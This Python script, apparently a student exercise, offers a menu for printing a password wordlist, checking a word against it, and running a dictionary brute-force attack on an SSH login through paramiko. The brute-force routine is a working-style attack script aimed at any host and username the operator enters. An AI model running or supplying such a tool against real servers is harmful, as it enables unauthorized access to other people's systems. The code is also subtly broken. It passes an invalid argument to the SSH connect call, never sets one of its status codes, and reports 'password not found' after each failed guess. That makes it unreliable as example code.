#!/usr/bin/env python3

# Script: Brute Force Tool
# Author: Ray Caoagdan
# Date of Last Revision: 08/16/2021

##############################################################################
# Import Library
##############################################################################
import time
import itertools
import sys, os, socket
import  paramiko 

##############################################################################
# Declare Functions
##############################################################################
def runIterator(): 
    filePath = input("Enter Dictionary File Path: \n" )
    with open(filePath) as wordList:
        for line in wordList:
            time.sleep(1)
            stripLine=line.strip()
            print (stripLine)       
    wordList.close()
    print(" ")

def runCheckPass():
    filePath = input("Enter Dictionary File Path: \n" )
    inputWrd= input("Please enter a word to seach: ")
    print(" ")
    with open(filePath) as wordList:
        if inputWrd in wordList.read():
            print("Word Appears on list")
        else:
            print("Word Does not exist on list")
    wordList.close()
    print(" ")

def sshConnect(ssh_host,ssh_user,ssh_pwd, connectStat = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ssh_host, username=ssh_user, password=ssh_pwd, connectStat=0)

    except paramiko.AuthenticationException:
        connectStat = 1 # Failed Authentication
    ssh.close()

    return connectStat

def bruteForce():
    ssh_host = input("Enter host: ")
    ssh_user = input("Enter username: ")
    filePath = input("Enter Dictionary File Path: \n")

    with open(filePath) as wordList:
        for passWrd in wordList:
            ssh_pwd = passWrd.strip('\n')
            print("Testing: " + str(ssh_pwd))
            connection = sshConnect(ssh_host,ssh_user,ssh_pwd)

            if connection == 0:
                print ('Succesful login to: ' + str(ssh_host) + ' username: ' + str(ssh_user) + ' password: ' + str(ssh_pwd))
            elif connection == 1:
                print ('No succesful attempts. Password not found')
            elif connection == 2:
                print("Connection could not be establish to: " + str(ssh_host))
            else:
                print ("UNKOWN ERROR")
        

  
    print(" ")

##############################################################################
# Main
##############################################################################
if __name__ == '__main__':
    while True:
        print("Brute Force Attack Menu \n")
        print("1: Offensive- Dictionary Iterator")
        print("2: Defensive- Password Recognized")
        print("3: Brute Force")
        print("4: Exit")
        mode=input("Please make a selection: ")

        if(mode == "1"):
            runIterator()
        elif(mode == "2"):
            runCheckPass()
        elif(mode == "3"):
            bruteForce()
        elif(mode == "4"):
            break
        else:
            print("INVALID SELECTION \n")
##############################################################################
# End
##############################################################################